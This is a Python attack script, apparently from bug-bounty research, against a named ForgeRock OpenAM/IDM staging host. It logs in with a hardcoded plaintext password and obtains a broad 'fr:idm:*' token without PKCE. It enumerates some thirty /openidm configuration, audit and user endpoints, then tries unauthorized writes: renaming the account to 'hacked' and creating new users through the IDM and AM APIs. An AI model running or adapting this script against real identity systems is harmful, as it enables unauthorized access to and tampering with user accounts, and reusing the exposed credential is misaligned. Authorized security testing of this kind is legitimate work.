# -*- coding: utf-8 -*-
"""AIC 第二十五轮:IDM 接口面(fr:idm:* token 权限边界)+ users 写操作
1. /openidm 子树枚举(config/managed/system/endpoint/workflow/recon/privilege)
2. users/{id} 写操作:PATCH/PUT/POST(会话 cookie 权限)
3. IDM 常见端点与 action
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = S.cookies.get('aa942d46ece12ce')
print('LOGIN OK, cookie len:', len(tok) if tok else 0)

from urllib.parse import quote

# 拿 fr:idm:* token(无 PKCE)
def get_token(scope):
    p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=%s&state=t' % (
        quote(RU, safe=''), quote(scope, safe=''))
    r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
    code = r.headers.get('Location', '').split('code=')[1].split('&')[0]
    r2 = requests.post(BASE + '/am/oauth2/realms/alpha/access_token',
                       data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                             'client_id': 'endUserUIClient'},
                       headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=12, verify=False)
    return r2.json().get('access_token', '')

tok_idm = get_token('openid fr:idm:*')
print('idm token:', tok_idm[:40])

S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643', 'Authorization': 'Bearer ' + tok_idm,
                   'Cookie': 'aa942d46ece12ce=' + tok,
                   'Content-Type': 'application/json', 'Accept-API-Version': 'resource=1.0'})

def probe(method, path, body=None, label=''):
    kw = {'timeout': 12, 'verify': False}
    if body is not None:
        kw['json'] = body
    try:
        r = S2.request(method, BASE + path, **kw)
        tag = ('  <= ' + label) if label else ''
        print('%-5s %-80s -> %d  %s%s' % (method, path[:80], r.status_code, r.text[:180].replace('\n', ' '), tag))
        return r
    except Exception as e:
        print('%-5s %-80s -> ERR %s' % (method, path[:80], str(e)[:60]))

print('\n=== 1. /openidm 子树枚举(fr:idm:*) ===')
for p in ['/openidm/managed/user?_queryFilter=true',
          '/openidm/managed/user?_queryId=query-all-ids',
          '/openidm/config',
          '/openidm/config/managed',
          '/openidm/config/endpoint',
          '/openidm/config/selfservice',
          '/openidm/system',
          '/openidm/endpoint',
          '/openidm/endpoint/staticUser',
          '/openidm/endpoint/gettables',
          '/openidm/recon',
          '/openidm/workflow',
          '/openidm/workflow/processinstance',
          '/openidm/privilege',
          '/openidm/policy',
          '/openidm/info/summary',
          '/openidm/log',
          '/openidm/audit',
          '/openidm/audit/access',
          '/openidm/roles?_queryFilter=true',
          '/openidm/identities?_queryFilter=true',
          '/openidm/relationships?_queryFilter=true',
          '/openidm/oauth2cache',
          '/openidm/security',
          '/openidm/schema/managed/user',
          '/openidm/scripts',
          '/openidm/emailTemplate?_queryFilter=true',
          '/openidm/notification?_queryFilter=true',
          '/openidm/ui/configuration',
          '/openidm/ui/endpoint']:
    probe('GET', p)

print('\n=== 2. managed/user 写操作 ===')
probe('PATCH', '/openidm/managed/user/' + MY_ID,
      [{'operation': 'replace', 'field': '/givenName', 'value': 'hacked'}], 'PATCH 自己')
probe('PUT', '/openidm/managed/user/' + MY_ID,
      {'userName': 'pccp', 'givenName': 'hacked'}, 'PUT 自己')
probe('POST', '/openidm/managed/user?_action=create',
      {'userName': 'test1643x', 'givenName': 't', 'sn': 'x', 'mail': 't@t.com', 'password': 'Test12345!'}, 'create 新用户')
probe('POST', '/openidm/managed/user?_action=search',
      {'queryFilter': 'userName eq "pccp"'}, 'search action')

print('\n=== 3. users(AM)写操作(会话 cookie) ===')
S3 = requests.Session()
S3.trust_env = False
S3.proxies = {'http': None, 'https': None}
S3.headers.update({'User-Agent': 'research-1643', 'Cookie': 'aa942d46ece12ce=' + tok,
                   'Content-Type': 'application/json', 'Accept-API-Version': 'resource=2.1, protocol=1.0'})
def probe2(method, path, body=None, label=''):
    kw = {'timeout': 12, 'verify': False}
    if body is not None:
        kw['json'] = body
    try:
        r = S3.request(method, BASE + path, **kw)
        tag = ('  <= ' + label) if label else ''
        print('%-5s %-80s -> %d  %s%s' % (method, path[:80], r.status_code, r.text[:180].replace('\n', ' '), tag))
        return r
    except Exception as e:
        print('%-5s %-80s -> ERR %s' % (method, path[:80], str(e)[:60]))

probe2('PATCH', '/am/json/realms/root/realms/alpha/users/' + MY_ID,
       [{'operation': 'replace', 'field': '/givenName', 'value': 'hacked2'}], 'PATCH users 自己')
probe2('PUT', '/am/json/realms/root/realms/alpha/users/' + MY_ID,
       {'givenName': ['hacked2']}, 'PUT users 自己')
probe2('POST', '/am/json/realms/root/realms/alpha/users?_action=create',
       {'username': 'test1643y', 'userpassword': 'Test12345!', 'mail': 'y@y.com'}, 'create AM 用户')

print('\n=== 4. userinfo 完整响应 + id_token 解码 ===')
# userinfo(带 fr:idm:* token)
r = S.get(BASE + '/am/oauth2/realms/alpha/userinfo', headers={'Authorization': 'Bearer ' + tok_idm},
          timeout=12, verify=False)
print('userinfo(idm token):', r.status_code, r.text[:300].replace('\n', ' '))
# 拿 id_token
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=id_token&redirect_uri=%s&scope=openid&state=t&nonce=test123' % quote(RU, safe='')
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
frag = loc.split('#')[1] if '#' in loc else ''
idt = dict(kv.split('=') for kv in frag.split('&') if '=' in kv).get('id_token', '')
print('id_token len:', len(idt))
if idt:
    import base64
    payload = idt.split('.')[1]
    payload += '=' * (-len(payload) % 4)
    try:
        claims = json.loads(base64.urlsafe_b64decode(payload))
        print('id_token claims:', json.dumps(claims, indent=1)[:800])
    except Exception as e:
        print('decode err:', e)
